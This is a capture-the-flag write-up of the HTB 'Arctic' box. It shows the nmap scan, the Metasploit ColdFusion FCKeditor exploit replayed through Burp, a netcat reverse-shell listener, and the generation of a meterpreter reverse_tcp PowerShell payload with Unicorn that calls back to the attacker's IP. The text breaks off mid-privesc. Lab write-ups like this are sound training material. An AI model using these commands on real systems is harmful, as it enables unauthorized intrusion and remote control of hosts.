In this box, we'll see how to set up a BurpSuite proxy to circomvent MSF timeout and exploit an Adobe ColdFusion vuln and ride a Unicorn made of Python.<br><br>

### 0x00 : Recon

First things first, some recon. For that we'll use nmap with some options<br>
* -sC : --script=safe,intrusive
* -sV : get the running version of the services
* -T4 : no more than 10ms dynamic delay
* -oA : output logs in all formats

{% highlight bash %}
  $ nmap -sC -sV -T4 -oA arctic 10.10.10.11
{% endhighlight %}

The scan shows an open port 8500 and nothing much.<br>
Firing up our browser and connecting to the box reveals an Adobe ColdFusion login screen.<br>
Our next step will be to search for a suitable exploit in SearchSploit :

{% highlight bash %}
  $ searchsploit coldfusion
{% endhighlight %}

### 0x01 : Exploitation

Many exploits here and a MSF module. Let's try it into msfconsole :

{% highlight bash %}
  # msfdb start
  $ msfconsole
  msf > search coldfusion
{% endhighlight %}

> screenshot

<br>

{% highlight bash %}
  msf > use exploit/windows/http/coldfusion_fckeditor
  msf > set RHOST 10.10.10.11
  msf > set RPORT 8500
  msf > run
{% endhighlight %}

And... it hangs... and fails...<br>
I'm pretty sure we could increase msf timeout to avoid that problem, but we're not here for that.<br>
Let's do that another way, firing up BurpSuite, setting a proxy listener to capture the msf payload and replay it !<br>

Now that we have a better control over the network/payload, all we need is a Ncat listener for our reverse shell to connect to.

{% highlight bash %}
  $ nc -lvnp 4444
{% endhighlight %}

And this time, it works !

### 0x03 : Privesc

Ok, now we've got a shell. But a pretty simple one. Let's improve that by getting a meterpreter reverse shell using a Python Unicorn (yes they are real).<br>
You can get your very own unicorn [here](https://github.com/trustedsec/unicorn).
{% highlight bash %}
  $ /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp M.Y.I.P 31337
{% endhighlight %}
In case it is not clear "M.Y.I.P" refers to "my ip", so use your own.<br>
Two files should be generated :
* unicorn.rc
* powershell_attack.txt
The unicorn.rc file contains the Metasploit config options and will be loaded that way :
{% highlight bash %}
  $ msfconsole -r unicorn.rc
{% endhighlight %}
The powershell_attack file contains the actual payload
